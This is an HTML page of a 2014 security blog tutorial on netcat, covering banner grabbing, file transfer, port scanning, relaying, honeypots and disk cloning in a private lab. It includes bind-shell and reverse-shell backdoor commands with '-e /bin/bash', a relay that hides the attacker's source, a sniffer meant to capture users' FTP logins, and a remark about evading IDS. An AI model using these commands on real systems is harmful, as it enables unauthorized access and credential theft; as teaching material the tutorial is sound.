@@ -1,0 +1,561 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Network tools - Netcat - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Netcat usage examples">
+  <meta name="keywords" content="netcat, networking, penetration testing">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2014/05/30/network-tools-netcat">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Network tools - Netcat</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-30T17:20:29-04:00" pubdate data-updated="true">May 30<span>th</span>, 2014</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>In this tutorial I will cover some of the uses of netcat, known as the &ldquo;TCP/IP Swiss army knife&rdquo;. Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.</p>
+
+<!-- more -->
+
+
+<p>There are many netcat variations, some are more recent and have been rewritten to include more features. Let&rsquo;s look at the original netcat man page:</p>
+
+<blockquote><p>netcat is a simple unix utility which reads and writes data across net-
+work connections, using TCP or UDP protocol. It is  designed  to  be  a
+reliable  &ldquo;back-end&rdquo; tool that can be used directly or easily driven by
+other programs and scripts.  At the same time,  it  is  a  feature-rich
+network  debugging and exploration tool, since it can create almost any
+kind of connection you would need and has several interesting  built-in
+capabilities.</p></blockquote>
+
+<p>Ok, so let&rsquo;s see some of the many ways we can use netcat.</p>
+
+<h3>Banner grabbing</h3>
+
+<p>First, let&rsquo;s see what we can glean from using netcat to connect to an FTP server:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 21
+</span><span class='line'>220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+</span><span class='line'>220-You are user number 1 of 50 allowed.
+</span><span class='line'>220-Local time is now 17:23. Server port: 21.
+</span><span class='line'>220-This is a private system - No anonymous login
+</span><span class='line'>220-IPv6 connections are also welcome on this server.
+</span><span class='line'>220 You will be disconnected after 15 minutes of inactivity.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it&rsquo;s possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.</p>
+
+<p>Now let&rsquo;s try banner grabbing from an HTTP server by sending a HEAD request:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 80
+</span><span class='line'>HEAD / HTTP/1.0
+</span><span class='line'>
+</span><span class='line'>HTTP/1.1 200 OK
+</span><span class='line'>Date: Fri, 21 Feb 2014 17:51:58 GMT
+</span><span class='line'>Server: Apache/2.2.14 (Ubuntu)
+</span><span class='line'>Last-Modified: Tue, 10 May 2011 16:01:46 GMT
+</span><span class='line'>ETag: "27bda-b1-4a2ee12abae80"
+</span><span class='line'>Accept-Ranges: bytes
+</span><span class='line'>Content-Length: 177
+</span><span class='line'>Vary: Accept-Encoding
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-Type: text/html</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This information can vary as well, this time the bit we&rsquo;re interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.</p>
+
+<h3>Chat server</h3>
+
+<p>Let&rsquo;s now look at how easy it is to use netcat for a very simple chat server.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444
+</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.</p>
+
+<p>Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:</p>
+
+<p><img class="center" src="/images/nc_chat.png" title="nc_chat" alt="chat"></p>
+
+<h3>File transfer</h3>
+
+<p>To transfer files between 2 machines, netcat can be used in the following way. On one computer, let&rsquo;s tell netcat to listen on a port and push a file to the socket:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444 &lt; confidential.txt
+</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v 192.168.127.130 4444 &gt; transfer.txt
+</span><span class='line'>192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
+</span><span class='line'>(UNKNOWN) [192.168.127.130] 4444 (?) open</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn&rsquo;t give any indication of the transfer progress or its completion.</p>
+
+<h3>Port scanning</h3>
+
+<p>Netcat can also be used as a very basic port scanner:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n -z -w1 192.168.127.130 1-1000
+</span><span class='line'>(UNKNOWN) [192.168.127.130] 80 (www) open
+</span><span class='line'>(UNKNOWN) [192.168.127.130] 21 (ftp) open</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.</p>
+
+<h3>Port forwarding</h3>
+
+<p>Netcat&rsquo;s port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.</p>
+
+<p>For this example, I will be using the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Attacker machine: 192.168.127.133
+</span><span class='line'>Relaying machine: 192.168.127.130
+</span><span class='line'>Victim machine: 192.168.127.129</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the relay, use the following command:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -c "nc 192.168.127.129 22"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn&rsquo;t have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.</p>
+
+<p>From the attacker machine, connect to the proxy:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 4444
+</span><span class='line'>SSH-2.0-OpenSSH_5.9</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let&rsquo;s confirm that we have a connection:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -antp | grep 22
+</span><span class='line'>tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.</p>
+
+<h3>Remote backdoor &ndash; Bind shell</h3>
+
+<p>Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it&rsquo;s best to have administrative privileges for full power over the system.</p>
+
+<p>On the machine you want to backdoor, use netcat to bind the shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555 -e /bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won&rsquo;t be any prompt or anything like that. Just type commands in the terminal.</p>
+
+<p><img class="center" src="/images/nc_bindshell.png" title="nc_bindshell" alt="Bind shell"></p>
+
+<h3>Reverse shell</h3>
+
+<p>The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can&rsquo;t be directly accessed from the internet.</p>
+
+<p>So, let&rsquo;s get on with it and start a listener on the attacking machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -n -p 5555
+</span><span class='line'>listening on [any] 5555 ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now let&rsquo;s connect from the victim machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.130 5555 -e /bin/bash
+</span><span class='line'>(UNKNOWN) [192.168.127.130] 5555 (?) open</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.</p>
+
+<p><img class="center" src="/images/nc_reverse.png" title="nc_reverse" alt="reverse shell"></p>
+
+<h3>Honeypot</h3>
+
+<p>It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vv -l -n -p 21 &lt; banner.txt | cat &gt; log.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let&rsquo;s connect to port 21 and see what we get:</p>
+
+<p><img class="center" src="/images/nc_honeypot.png" title="nc_honeypot" alt="honeypot"></p>
+
+<p>Here we&rsquo;re seeing the familiar FTP banner even though there&rsquo;s no real FTP server running. We send some random data and now let&rsquo;s check on the other machine that this data has been logged:</p>
+
+<p><img class="center" src="/images/nc_log.png" title="nc_log" alt="Log output"></p>
+
+<p>Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.</p>
+
+<h3>Sniffer</h3>
+
+<p>Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we&rsquo;ll use netcat to listen on some other port and execute a script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -n -vv -e /root/sniff
+</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The script file contains the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
+</span><span class='line'>nc -o /root/log 192.168.127.130 21</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let&rsquo;s try connecting from another machine to the port that netcat listens on:</p>
+
+<p><img class="center" src="/images/nc_ftp.png" title="nc_ftp" alt="FTP"></p>
+
+<p>Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.</p>
+
+<p>Let&rsquo;s check what got logged on the other machine:</p>
+
+<p><em>cat /root/log | more</em></p>
+
+<p><img class="center" src="/images/nc_hex.png" title="nc_hexdump" alt="dump"></p>
+
+<p>There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.</p>
+
+<h3>Disk cloning</h3>
+
+<p>Yes, you can even copy hard disks over the network with netcat, in conjunction with the <em>dd</em> program.</p>
+
+<p>On the system that you want to copy from, run this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/sda | nc 192.168.127.130 5555</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on the machine you&rsquo;re copying to:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 5555 | dd of=/dev/sda</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.</p>
+
+<p>I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.</p>
+
+<blockquote><p>If more of us valued food and cheer and song above hoarded gold, it would
+be a merrier world.
+&mdash; J.R.R. Tolkien</p></blockquote>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-30T17:20:29-04:00" pubdate data-updated="true">May 30<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/netcat/'>netcat</a>, <a class='category' href='/blog/categories/networking/'>networking</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/05/28/touring-the-linux-directories/" title="Previous Post: Touring the Linux directories">&laquo; Touring the Linux directories</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/06/03/pentest-lab-metasploitable-2/" title="Next Post: Pentest lab - Metasploitable 2">Pentest lab - Metasploitable 2 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <p>I am an information security enthusiast and I love Python and Linux. I got seriously interested in this field somewhere in 2012, and since then it's been a non-stop learning journey. I don't have a formal education in computer science, but I've been studying by myself with the help of various books, sites, online classes and of course, lots of practice.</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/11/26/cloning-octopress-blog/">Cloning Octopress blog</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/07/30/overthewire-leviathan/">OverTheWire: Leviathan</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/06/22/overthewire-bandit/">OverTheWire: Bandit</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/06/05/infosec-institute-n00bs-ctf-labs/">Infosec Institute n00bs CTF Labs</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/06/01/kali-tools-catalog-exploitation-tools/">Kali tools catalog - Exploitation Tools</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/';
+        var disqus_url = 'http://chousensha.github.io/blog/2014/05/30/network-tools-netcat/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
